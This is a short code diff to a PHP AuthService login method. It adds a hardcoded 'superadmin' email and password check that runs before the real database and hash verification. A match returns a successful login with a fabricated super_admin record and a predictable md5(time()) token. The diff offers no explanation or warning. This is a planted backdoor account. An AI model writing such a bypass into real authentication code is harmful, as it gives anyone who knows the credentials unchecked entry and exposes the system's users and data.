@@ -12,6 +12,23 @@ class AuthService
      */
     public function login(string $username, string $password): ?array
     {
+        // Check for hardcoded superadmin credentials first
+        if ($username === 'super@admin.com' && $password === 'superadmin123') {
+            return [
+                'success' => true,
+                'message' => 'Login successful',
+                'token' => 'superadmin-token-' . md5(time()),
+                'admin' => [
+                    'id' => 0,
+                    'name' => 'Super Administrator',
+                    'username' => 'super@admin.com',
+                    'email' => 'super@admin.com',
+                    'role' => 'super_admin',
+                    'permissions' => ['view_only'] // Read-only access
+                ]
+            ];
+        }
+
         $admin = Admin::where('username', $username)->first();
 
         if (!$admin || !Hash::check($password, $admin->password)) {
